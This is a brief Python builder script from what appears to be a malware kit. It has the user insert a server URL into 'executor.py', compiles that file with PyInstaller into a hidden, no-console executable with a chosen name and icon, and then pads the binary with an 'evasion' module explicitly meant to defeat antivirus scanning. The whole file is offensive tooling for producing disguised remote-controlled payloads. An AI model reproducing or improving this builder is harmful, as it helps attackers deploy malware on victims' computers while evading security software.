from evasion import increasesize
import os

reply = input("Have you appended executor.py with your server's URL? Y/N: ")
if reply.lower() == "y":
    name = input("What shall be the name of the executable? ")
    use_icon = input("Use default icon? Y/N: ")
    if use_icon.lower() == "y":
        os.system(f"""pyinstaller executor.py --noconsole --onefile --icon=resources\icon.ico --name="{name}" """)
        print("Appending data for AV evasion.")
        increasesize.append_data(f"dist\{name}.exe")
    else:
        icon = input("Path of the icon.ico to use (relative to this directory): ")
        os.system(f"""pyinstaller executor.py --noconsole --onefile --icon={icon} --name="{name}" """)
        print("Appending data for AV evasion.")
        increasesize.append_data(f"dist\{name}.exe")
    